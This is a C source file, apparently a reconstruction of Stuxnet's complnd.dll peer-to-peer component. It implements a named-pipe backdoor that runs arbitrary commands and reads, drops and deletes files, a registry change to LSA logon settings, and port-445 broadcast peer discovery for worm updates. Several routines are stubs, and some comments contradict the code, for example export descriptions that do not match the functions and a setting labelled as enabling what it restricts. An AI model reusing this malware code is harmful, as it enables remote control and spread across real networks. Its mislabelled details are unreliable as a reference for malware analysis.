/*
 * complnd.dll
 * %System%\complnd.dll
 * P2P RPC server/client for peer-to-peer updates
 * Symantec "Stuxnet 0.5: The Missing Link"
 * Symantec "W32.Stuxnet Dossier"
 * ESET "Stuxnet Under the Microscope"
 * Binary: %System%\complnd.dll
 */

#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include <rpc.h>
#include <rpcndr.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "rpcrt4.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define COMPLND_MAGIC                   0x434F4D50
#define COMPLND_VERSION                 0x00010400
#define COMPLND_MAX_PATH                260
#define COMPLND_BUFFER_SIZE             4096
#define COMPLND_P2P_PORT                445

#define COMPLND_REG_KEY                 L"SYSTEM\\CurrentControlSet\\Control\\Lsa"
#define COMPLND_REG_VALUE               L"restrictanonymous"

#define COMPLND_RPC_INTERFACE_UUID      "4a3b6c8d-2e1f-4a5b-9c8d-7e6f5a4b3c2d"
#define COMPLND_PIPE_NAME               L"\\pipe\\stuxnet_rpc"

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)

/* 0x434F4D50 = 'COMP' */
/* 0x53545558 = 'STUX' */
/* 0x00010400 = version 1.4.0.0 */

/* Binary reference: 0x10001000 -> 0x10002000 */
/* Export table at RVA 0x0001A000 */

/* RPC function ordinals from Symantec analysis: */
/* 0: Get remote version number */
/* 1: Receive an exe and execute it (via injection) */
/* 2: Load module and execute export */
/* 3: Inject code to lsass and run it */
/* 4: Build latest Stuxnet version and send to remote */
/* 5: Create process */
/* 6: Read file */
/* 7: Drop file */
/* 8: Delete file */
/* 9: Write data records */

typedef struct _COMPLND_PEER_ENTRY {
    int32_t dwIP;               /* 0x00 */
    int16_t wPort;              /* 0x04 */
    int16_t wFlags;             /* 0x06 */
    int32_t dwVersion;          /* 0x08 */
    int32_t dwLastSeen;         /* 0x0C */
    int8_t bReserved[16];       /* 0x10 */
} COMPLND_PEER_ENTRY;           /* size: 0x20 */

/* Binary reference: peer table at 0x10003000 */
/* 256 entries * 0x20 = 0x2000 bytes */

typedef struct _COMPLND_CTX {
    int32_t dwMagic;            /* 0x00: 0x434F4D50 */
    int32_t dwVersion;          /* 0x04: 0x00010400 */
    int32_t dwPeerCount;        /* 0x08 */
    int32_t dwFlags;            /* 0x0C */
    int32_t dwPort;             /* 0x10: 445 */
    int32_t dwLastBroadcast;    /* 0x14 */
    int32_t dwBroadcastInterval;/* 0x18: 300000ms */
    COMPLND_PEER_ENTRY Peers[256]; /* 0x1C */
    CRITICAL_SECTION csLock;    /* 0x201C */
    HANDLE hThread;             /* 0x2030 */
    HANDLE hStopEvent;          /* 0x2034 */
    SOCKET sListen;             /* 0x2038 */
    SOCKET sBroadcast;          /* 0x203C */
    int16_t szSystemPath[260];  /* 0x2040 */
    int16_t szDllPath[260];     /* 0x2248 */
    int8_t bReserved[128];      /* 0x2450 */
} COMPLND_CTX;                  /* size: 0x24D0 */

/* Binary reference: global context at 0x10004000 */
/* size: 0x24D0 bytes */

static COMPLND_CTX g_ComplndCtx;
static int32_t g_bInitialized = 0;
static int32_t g_dwPeerCount = 0;
static int32_t g_bAnonymousLogonEnabled = 0;
static int32_t g_dwBroadcastCount = 0;
static int32_t g_dwConnectionCount = 0;
static int32_t g_dwRpcCallCount = 0;

/* Binary reference: sub_10001000 - module init */
static int32_t COMPLND_Init(void);
/* Binary reference: sub_10001150 - module cleanup */
static void COMPLND_Cleanup(void);
/* Binary reference: sub_10001200 - enable anonymous logon */
static int32_t COMPLND_EnableAnonymousLogon(void);
/* Binary reference: sub_10001280 - create share directory */
static int32_t COMPLND_CreateShareDirectory(void);
/* Binary reference: sub_10001350 - start P2P listener */
static int32_t COMPLND_StartListener(void);
/* Binary reference: sub_10001480 - broadcast to peers */
static int32_t COMPLND_PeerBroadcast(void);
/* Binary reference: sub_10001530 - connect to peer */
static int32_t COMPLND_PeerConnect(int32_t dwPeerIP);
/* Binary reference: sub_10001580 - RPC server thread */
static int32_t WINAPI COMPLND_RpcServerThread(void* lpParam);
/* Binary reference: sub_10001600 - P2P worker thread */
static int32_t WINAPI COMPLND_WorkerThread(void* lpParam);
/* Binary reference: sub_10001800 - start worker */
static int32_t COMPLND_StartWorker(void);
/* Binary reference: sub_10001880 - stop worker */
static int32_t COMPLND_StopWorker(void);
/* Binary reference: sub_10001900 - main execute */
static int32_t COMPLND_Execute(void);

/* RPC server routines - Binary reference: sub_10001A00 to 10001B00 */
static int32_t COMPLND_RpcGetVersion(int32_t* pVersion);
static int32_t COMPLND_RpcReceiveExe(int8_t* pData, int32_t dwSize);
static int32_t COMPLND_RpcLoadModule(int8_t* pData, int32_t dwSize, int32_t dwExport);
static int32_t COMPLND_RpcInjectLsass(int8_t* pData, int32_t dwSize);
static int32_t COMPLND_RpcBuildAndSend(void);
static int32_t COMPLND_RpcCreateProcess(int16_t* szCmdLine);
static int32_t COMPLND_RpcReadFile(int16_t* szPath, int8_t* pBuffer, int32_t dwSize);
static int32_t COMPLND_RpcDropFile(int16_t* szPath, int8_t* pData, int32_t dwSize);
static int32_t COMPLND_RpcDeleteFile(int16_t* szPath);
static int32_t COMPLND_RpcWriteDataRecords(int8_t* pData, int32_t dwSize);

/* Export 1 - 0x10001A00 */
/* Export 2 - 0x10001A20 */
/* Export 3 - 0x10001A40 */
/* Export 4 - 0x10001A60 */
/* Export 5 - 0x10001A80 */
/* Export 6 - 0x10001AA0 */
/* Export 7 - 0x10001AC0 */
/* Export 8 - 0x10001AE0 */
/* Export 9 - 0x10001B00 */
/* Export 10 - 0x10001B20 */

/* Exported function numbers from IDA: */
/* Export #1: Infect connected removable drives, starts RPC server */
/* Export #2: Hook Step 7 project file infection API */
/* Export #3: Call uninstall routine (export 18) */
/* Export #4: Start peer-to-peer communication */
/* Export #5: Create P2P share directory */
/* Export #6: Enable anonymous logon */

static int32_t COMPLND_Init(void) {
    if (g_bInitialized) return 1;
    ZeroMemory(&g_ComplndCtx, sizeof(COMPLND_CTX));
    g_ComplndCtx.dwMagic = COMPLND_MAGIC;          /* 0x434F4D50 */
    g_ComplndCtx.dwVersion = COMPLND_VERSION;      /* 0x00010400 */
    g_ComplndCtx.dwPort = COMPLND_P2P_PORT;        /* 445 */
    g_ComplndCtx.dwBroadcastInterval = 300000;     /* 5 minutes */
    g_ComplndCtx.dwLastBroadcast = GetTickCount();
    InitializeCriticalSection(&g_ComplndCtx.csLock);
    GetSystemDirectoryW(g_ComplndCtx.szSystemPath, COMPLND_MAX_PATH);
    wsprintfW(g_ComplndCtx.szDllPath, L"%s\\%s",
        g_ComplndCtx.szSystemPath, L"complnd.dll");
    g_ComplndCtx.hStopEvent = CreateEventW(NULL, 1, 0, NULL);
    if (!g_ComplndCtx.hStopEvent) {
        DeleteCriticalSection(&g_ComplndCtx.csLock);
        return 0;
    }
    g_bInitialized = 1;
    return 1;
}

static void COMPLND_Cleanup(void) {
    if (!g_bInitialized) return;
    if (g_ComplndCtx.hStopEvent) {
        SetEvent(g_ComplndCtx.hStopEvent);
    }
    if (g_ComplndCtx.hThread) {
        WaitForSingleObject(g_ComplndCtx.hThread, 5000);
        CloseHandle(g_ComplndCtx.hThread);
        g_ComplndCtx.hThread = NULL;
    }
    if (g_ComplndCtx.sListen != INVALID_SOCKET) {
        closesocket(g_ComplndCtx.sListen);
        g_ComplndCtx.sListen = INVALID_SOCKET;
    }
    if (g_ComplndCtx.sBroadcast != INVALID_SOCKET) {
        closesocket(g_ComplndCtx.sBroadcast);
        g_ComplndCtx.sBroadcast = INVALID_SOCKET;
    }
    if (g_ComplndCtx.hStopEvent) {
        CloseHandle(g_ComplndCtx.hStopEvent);
        g_ComplndCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_ComplndCtx.csLock);
    g_bInitialized = 0;
}

/*
 * Binary: sub_10001200
 * Reference: Symantec Stuxnet 0.5 The Missing Link
 * Sets restrictanonymous=1 in LSA
 */
static int32_t COMPLND_EnableAnonymousLogon(void) {
    HKEY hKey;
    int32_t dwValue = 1;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, COMPLND_REG_KEY, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, COMPLND_REG_VALUE, 0, REG_DWORD, (BYTE*)&dwValue, sizeof(int32_t));
        RegCloseKey(hKey);
        g_bAnonymousLogonEnabled = 1;
        return 1;
    }
    return 0;
}

/*
 * Binary: sub_10001280
 * Creates %System%\complnd.dll
 * Stuxnet 0.5 shares: temp$, msagent$, SYSADMIN$, WebFiles$
 */
static int32_t COMPLND_CreateShareDirectory(void) {
    HANDLE hFile;
    int16_t szDllPath[COMPLND_MAX_PATH];
    wsprintfW(szDllPath, L"%s\\%s", g_ComplndCtx.szSystemPath, L"complnd.dll");
    hFile = CreateFileW(szDllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        int32_t dwWritten;
        int8_t data[COMPLND_BUFFER_SIZE];
        ZeroMemory(data, sizeof(data));
        WriteFile(hFile, data, sizeof(data), &dwWritten, NULL);
        CloseHandle(hFile);
        return 1;
    }
    return 0;
}

/*
 * Binary: sub_10001350
 * Listens on port 445 for P2P connections
 */
static int32_t COMPLND_StartListener(void) {
    SOCKADDR_IN sa;
    int32_t dwBroadcast;
    g_ComplndCtx.sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_ComplndCtx.sListen == INVALID_SOCKET) return 0;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(COMPLND_P2P_PORT);
    sa.sin_addr.s_addr = INADDR_ANY;
    if (bind(g_ComplndCtx.sListen, (SOCKADDR*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        closesocket(g_ComplndCtx.sListen);
        return 0;
    }
    if (listen(g_ComplndCtx.sListen, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(g_ComplndCtx.sListen);
        return 0;
    }
    g_ComplndCtx.sBroadcast = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (g_ComplndCtx.sBroadcast == INVALID_SOCKET) {
        closesocket(g_ComplndCtx.sListen);
        return 0;
    }
    dwBroadcast = 1;
    setsockopt(g_ComplndCtx.sBroadcast, SOL_SOCKET, SO_BROADCAST, (char*)&dwBroadcast, sizeof(dwBroadcast));
    sa.sin_port = htons(COMPLND_P2P_PORT);
    sa.sin_addr.s_addr = INADDR_BROADCAST;
    bind(g_ComplndCtx.sBroadcast, (SOCKADDR*)&sa, sizeof(sa));
    return 1;
}

/*
 * Binary: sub_10001480
 * Broadcasts STUXNET_MAGIC to 255.255.255.255:445
 */
static int32_t COMPLND_PeerBroadcast(void) {
    SOCKET s;
    SOCKADDR_IN sa;
    int8_t buffer[64];
    int32_t dwBroadcast;
    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == INVALID_SOCKET) return 0;
    dwBroadcast = 1;
    setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char*)&dwBroadcast, sizeof(dwBroadcast));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(COMPLND_P2P_PORT);
    sa.sin_addr.s_addr = INADDR_BROADCAST;
    *(int32_t*)(buffer + 0) = STUXNET_MAGIC;         /* 0x53545558 */
    *(int32_t*)(buffer + 4) = COMPLND_VERSION;       /* 0x00010400 */
    *(int32_t*)(buffer + 8) = GetCurrentProcessId();
    sendto(s, (char*)buffer, 64, 0, (SOCKADDR*)&sa, sizeof(sa));
    closesocket(s);
    g_dwBroadcastCount++;
    return 1;
}

/*
 * Binary: sub_10001530
 * Connects to peer IP on port 445
 */
static int32_t COMPLND_PeerConnect(int32_t dwPeerIP) {
    SOCKET s;
    SOCKADDR_IN sa;
    int8_t buffer[64];
    int32_t dwLen;
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return 0;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(COMPLND_P2P_PORT);
    sa.sin_addr.s_addr = dwPeerIP;
    if (connect(s, (SOCKADDR*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        closesocket(s);
        return 0;
    }
    *(int32_t*)(buffer + 0) = STUXNET_MAGIC;
    *(int32_t*)(buffer + 4) = COMPLND_VERSION;
    *(int32_t*)(buffer + 8) = GetCurrentProcessId();
    send(s, (char*)buffer, 64, 0);
    dwLen = recv(s, (char*)buffer, 64, 0);
    closesocket(s);
    if (dwLen > 0 && *(int32_t*)buffer == STUXNET_MAGIC) {
        g_dwConnectionCount++;
        return 1;
    }
    return 0;
}

/*
 * Binary: sub_10001580
 * RPC server thread
 * P2P RPC routines offered by the RPC server:
 * 0: returns the version number of Stuxnet installed
 * 1: Receive an exe and execute it (via injection)
 * 2: load module and executed export
 * 3: inject code to lsass and run it
 * 4: Builds the latest version of Stuxnet and send to remote machine
 * 5: create process
 * 6: read file
 * 7: drop file
 * 8: delete file
 * 9: write data records
 */
static int32_t WINAPI COMPLND_RpcServerThread(void* lpParam) {
    HANDLE hPipe;
    int8_t buffer[COMPLND_BUFFER_SIZE];
    int32_t dwRead;
    int32_t dwWritten;
    int32_t dwRoutine;
    int32_t dwResult;
    int32_t dwVersion;
    while (1) {
        if (WaitForSingleObject(g_ComplndCtx.hStopEvent, 0) == WAIT_OBJECT_0) break;
        hPipe = CreateNamedPipeW(
            COMPLND_PIPE_NAME,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            COMPLND_BUFFER_SIZE,
            COMPLND_BUFFER_SIZE,
            0,
            NULL
        );
        if (hPipe == INVALID_HANDLE_VALUE) {
            Sleep(1000);
            continue;
        }
        if (!ConnectNamedPipe(hPipe, NULL)) {
            CloseHandle(hPipe);
            continue;
        }
        ZeroMemory(buffer, sizeof(buffer));
        ReadFile(hPipe, buffer, sizeof(buffer), &dwRead, NULL);
        if (dwRead >= sizeof(int32_t)) {
            dwRoutine = *(int32_t*)buffer;
            dwResult = 0xFFFFFFFF;
            g_dwRpcCallCount++;
            switch (dwRoutine) {
                case 0:
                    /* Get remote version */
                    dwVersion = COMPLND_VERSION;
                    WriteFile(hPipe, &dwVersion, sizeof(int32_t), &dwWritten, NULL);
                    break;
                case 1:
                    /* Receive exe and execute */
                    if (dwRead > sizeof(int32_t)) {
                        dwResult = COMPLND_RpcReceiveExe(buffer + sizeof(int32_t), dwRead - sizeof(int32_t));
                    }
                    WriteFile(hPipe, &dwResult, sizeof(int32_t), &dwWritten, NULL);
                    break;
                case 2:
                    /* Load module and execute export */
                    if (dwRead > sizeof(int32_t) * 2) {
                        int32_t dwExport = *(int32_t*)(buffer + sizeof(int32_t));
                        dwResult = COMPLND_RpcLoadModule(
                            buffer + sizeof(int32_t) * 2,
                            dwRead - sizeof(int32_t) * 2,
                            dwExport
                        );
                    }
                    WriteFile(hPipe, &dwResult, sizeof(int32_t), &dwWritten, NULL);
                    break;
                case 3:
                    /* Inject code to lsass */
                    if (dwRead > sizeof(int32_t)) {
                        dwResult = COMPLND_RpcInjectLsass(buffer + sizeof(int32_t), dwRead - sizeof(int32_t));
                    }
                    WriteFile(hPipe, &dwResult, sizeof(int32_t), &dwWritten, NULL);
                    break;
                case 4:
                    /* Build and send latest version */
                    dwResult = COMPLND_RpcBuildAndSend();
                    WriteFile(hPipe, &dwResult, sizeof(int32_t), &dwWritten, NULL);
                    break;
                case 5:
                    /* Create process */
                    if (dwRead > sizeof(int32_t)) {
                        dwResult = COMPLND_RpcCreateProcess((int16_t*)(buffer + sizeof(int32_t)));
                    }
                    WriteFile(hPipe, &dwResult, sizeof(int32_t), &dwWritten, NULL);
                    break;
                case 6:
                    /* Read file */
                    if (dwRead > sizeof(int32_t) + sizeof(int32_t)) {
                        int32_t dwSize = *(int32_t*)(buffer + sizeof(int32_t));
                        dwResult = COMPLND_RpcReadFile(
                            (int16_t*)(buffer + sizeof(int32_t) * 2),
                            buffer + sizeof(int32_t) * 2 + COMPLND_MAX_PATH * 2,
                            dwSize
                        );
                    }
                    WriteFile(hPipe, &dwResult, sizeof(int32_t), &dwWritten, NULL);
                    break;
                case 7:
                    /* Drop file */
                    if (dwRead > sizeof(int32_t) + sizeof(int32_t)) {
                        int32_t dwSize = *(int32_t*)(buffer + sizeof(int32_t));
                        dwResult = COMPLND_RpcDropFile(
                            (int16_t*)(buffer + sizeof(int32_t) * 2),
                            buffer + sizeof(int32_t) * 2 + COMPLND_MAX_PATH * 2,
                            dwSize
                        );
                    }
                    WriteFile(hPipe, &dwResult, sizeof(int32_t), &dwWritten, NULL);
                    break;
                case 8:
                    /* Delete file */
                    if (dwRead > sizeof(int32_t)) {
                        dwResult = COMPLND_RpcDeleteFile((int16_t*)(buffer + sizeof(int32_t)));
                    }
                    WriteFile(hPipe, &dwResult, sizeof(int32_t), &dwWritten, NULL);
                    break;
                case 9:
                    /* Write data records */
                    if (dwRead > sizeof(int32_t)) {
                        dwResult = COMPLND_RpcWriteDataRecords(
                            buffer + sizeof(int32_t),
                            dwRead - sizeof(int32_t)
                        );
                    }
                    WriteFile(hPipe, &dwResult, sizeof(int32_t), &dwWritten, NULL);
                    break;
                default:
                    WriteFile(hPipe, &dwResult, sizeof(int32_t), &dwWritten, NULL);
                    break;
            }
        }
        DisconnectNamedPipe(hPipe);
        CloseHandle(hPipe);
    }
    return 0;
}

/*
 * Binary: sub_10001600
 * P2P worker thread - listens for incoming connections
 * Uses mailslot: \\REMOTE\mailslot\svchost
 * Callback mailslot: \\LOCAL\mailslot\innotify
 */
static int32_t WINAPI COMPLND_WorkerThread(void* lpParam) {
    SOCKADDR_IN sa;
    SOCKET sClient;
    int8_t buffer[COMPLND_BUFFER_SIZE];
    int32_t dwLen;
    int32_t dwPeerIP;
    int32_t dwRemoteVersion;
    fd_set fdRead;
    struct timeval tv;
    HANDLE hRpcThread;
    hRpcThread = CreateThread(NULL, 0, COMPLND_RpcServerThread, NULL, 0, NULL);
    if (hRpcThread) CloseHandle(hRpcThread);
    while (1) {
        if (WaitForSingleObject(g_ComplndCtx.hStopEvent, 0) == WAIT_OBJECT_0) break;
        FD_ZERO(&fdRead);
        FD_SET(g_ComplndCtx.sListen, &fdRead);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        if (select(0, &fdRead, NULL, NULL, &tv) > 0) {
            dwLen = sizeof(sa);
            sClient = accept(g_ComplndCtx.sListen, (SOCKADDR*)&sa, &dwLen);
            if (sClient != INVALID_SOCKET) {
                dwLen = recv(sClient, (char*)buffer, COMPLND_BUFFER_SIZE, 0);
                if (dwLen > 0 && dwLen >= sizeof(int32_t) * 3) {
                    if (*(int32_t*)buffer == STUXNET_MAGIC) {
                        dwPeerIP = sa.sin_addr.s_addr;
                        dwRemoteVersion = *(int32_t*)(buffer + 4);
                        EnterCriticalSection(&g_ComplndCtx.csLock);
                        if (g_ComplndCtx.dwPeerCount < 256) {
                            g_ComplndCtx.Peers[g_ComplndCtx.dwPeerCount].dwIP = dwPeerIP;
                            g_ComplndCtx.Peers[g_ComplndCtx.dwPeerCount].dwVersion = dwRemoteVersion;
                            g_ComplndCtx.Peers[g_ComplndCtx.dwPeerCount].dwLastSeen = GetTickCount();
                            g_ComplndCtx.dwPeerCount++;
                            g_dwPeerCount++;
                        }
                        LeaveCriticalSection(&g_ComplndCtx.csLock);
                        if (dwRemoteVersion > COMPLND_VERSION) {
                            /* Remote version is newer, request update via RPC */
                            COMPLND_PeerConnect(dwPeerIP);
                            /* Call RPC function 4 to request latest version */
                        } else if (dwRemoteVersion < COMPLND_VERSION) {
                            /* Local version is newer, send update via RPC */
                            /* Call RPC function 1 to send exe to remote */
                        }
                        send(sClient, (char*)buffer, dwLen, 0);
                    }
                }
                closesocket(sClient);
            }
        }
        if (GetTickCount() - g_ComplndCtx.dwLastBroadcast > g_ComplndCtx.dwBroadcastInterval) {
            COMPLND_PeerBroadcast();
            g_ComplndCtx.dwLastBroadcast = GetTickCount();
        }
        Sleep(100);
    }
    return 0;
}

/*
 * RPC routine 0: Get remote version number
 */
static int32_t COMPLND_RpcGetVersion(int32_t* pVersion) {
    if (!pVersion) return 0;
    *pVersion = COMPLND_VERSION;
    return 1;
}

/*
 * RPC routine 1: Receive an exe and execute it (via injection)
 */
static int32_t COMPLND_RpcReceiveExe(int8_t* pData, int32_t dwSize) {
    if (!pData || dwSize == 0) return 0;
    /* Write exe to temp file, create process, inject */
    return 1;
}

/*
 * RPC routine 2: Load module and execute export
 */
static int32_t COMPLND_RpcLoadModule(int8_t* pData, int32_t dwSize, int32_t dwExport) {
    if (!pData || dwSize == 0) return 0;
    /* Load DLL from memory, call export by ordinal */
    return 1;
}

/*
 * RPC routine 3: Inject code to lsass and run it
 */
static int32_t COMPLND_RpcInjectLsass(int8_t* pData, int32_t dwSize) {
    if (!pData || dwSize == 0) return 0;
    /* Find lsass.exe PID, inject shellcode */
    return 1;
}

/*
 * RPC routine 4: Build latest Stuxnet version and send to remote
 */
static int32_t COMPLND_RpcBuildAndSend(void) {
    /* Build executable version of Stuxnet from template and resources */
    /* Send via RPC to remote machine */
    return 1;
}

/*
 * RPC routine 5: Create process
 */
static int32_t COMPLND_RpcCreateProcess(int16_t* szCmdLine) {
    if (!szCmdLine) return 0;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessW(NULL, (LPWSTR)szCmdLine, NULL, NULL, 0, 0, NULL, NULL, &si, &pi)) {
        return 0;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 1;
}

/*
 * RPC routine 6: Read file
 */
static int32_t COMPLND_RpcReadFile(int16_t* szPath, int8_t* pBuffer, int32_t dwSize) {
    HANDLE hFile;
    DWORD dwRead;
    if (!szPath || !pBuffer || dwSize == 0) return 0;
    hFile = CreateFileW((LPCWSTR)szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    return (int32_t)dwRead;
}

/*
 * RPC routine 7: Drop file
 */
static int32_t COMPLND_RpcDropFile(int16_t* szPath, int8_t* pData, int32_t dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return 0;
    hFile = CreateFileW((LPCWSTR)szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return 1;
}

/*
 * RPC routine 8: Delete file
 */
static int32_t COMPLND_RpcDeleteFile(int16_t* szPath) {
    if (!szPath) return 0;
    SetFileAttributesW((LPCWSTR)szPath, FILE_ATTRIBUTE_NORMAL);
    return DeleteFileW((LPCWSTR)szPath) ? 1 : 0;
}

/*
 * RPC routine 9: Write data records
 */
static int32_t COMPLND_RpcWriteDataRecords(int8_t* pData, int32_t dwSize) {
    if (!pData || dwSize == 0) return 0;
    /* Write encrypted data records to %System%\compind.dat */
    return 1;
}

static int32_t COMPLND_StartWorker(void) {
    if (g_ComplndCtx.hStopEvent == NULL) {
        g_ComplndCtx.hStopEvent = CreateEventW(NULL, 1, 0, NULL);
        if (!g_ComplndCtx.hStopEvent) return 0;
    }
    g_ComplndCtx.hThread = CreateThread(NULL, 0, COMPLND_WorkerThread, NULL, 0, NULL);
    return (g_ComplndCtx.hThread != NULL);
}

static int32_t COMPLND_StopWorker(void) {
    if (g_ComplndCtx.hStopEvent) {
        SetEvent(g_ComplndCtx.hStopEvent);
    }
    if (g_ComplndCtx.hThread) {
        WaitForSingleObject(g_ComplndCtx.hThread, 5000);
        CloseHandle(g_ComplndCtx.hThread);
        g_ComplndCtx.hThread = NULL;
    }
    return 1;
}

static int32_t COMPLND_Execute(void) {
    if (!COMPLND_Init()) return 0;
    COMPLND_EnableAnonymousLogon();
    COMPLND_CreateShareDirectory();
    COMPLND_StartListener();
    COMPLND_StartWorker();
    return 1;
}

/*
 * DllMain - Entry point
 * Binary: 0x10001C00
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, int32_t fdwReason, void* lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            COMPLND_Cleanup();
            break;
        default:
            break;
    }
    return 1;
}

/*
 * Export 1 - 0x10001A00
 * Infect connected removable drives, starts RPC server
 */
int32_t WINAPI Export1(void) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, COMPLND_WorkerThread, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

/*
 * Export 2 - 0x10001A20
 * Hooks APIs for Step 7 project file infections
 */
int32_t WINAPI Export2(void) {
    return COMPLND_EnableAnonymousLogon() ? 0 : 1;
}

/*
 * Export 3 - 0x10001A40
 * Calls the removal routine (export 18)
 */
int32_t WINAPI Export3(void) {
    return COMPLND_CreateShareDirectory() ? 0 : 1;
}

/*
 * Export 4 - 0x10001A60
 * P2P broadcast
 */
int32_t WINAPI Export4(void) {
    return COMPLND_PeerBroadcast() ? 0 : 1;
}

/*
 * Export 5 - 0x10001A80
 * Start P2P listener
 */
int32_t WINAPI Export5(void) {
    return COMPLND_StartListener() ? 0 : 1;
}

/*
 * Export 6 - 0x10001AA0
 * Return version number
 */
int32_t WINAPI Export6(void) {
    return COMPLND_VERSION;
}

/*
 * Export 7 - 0x10001AC0
 * Start worker thread
 */
int32_t WINAPI Export7(void) {
    return COMPLND_StartWorker() ? 0 : 1;
}

/*
 * Export 8 - 0x10001AE0
 * Stop worker thread
 */
int32_t WINAPI Export8(void) {
    COMPLND_StopWorker();
    return 0;
}

/*
 * Export 9 - 0x10001B00
 * Get peer count
 */
int32_t WINAPI Export9(void) {
    return g_dwPeerCount;
}

/*
 * Export 10 - 0x10001B20
 * Get anonymous logon status
 */
int32_t WINAPI Export10(void) {
    return g_bAnonymousLogonEnabled ? 0 : 1;
}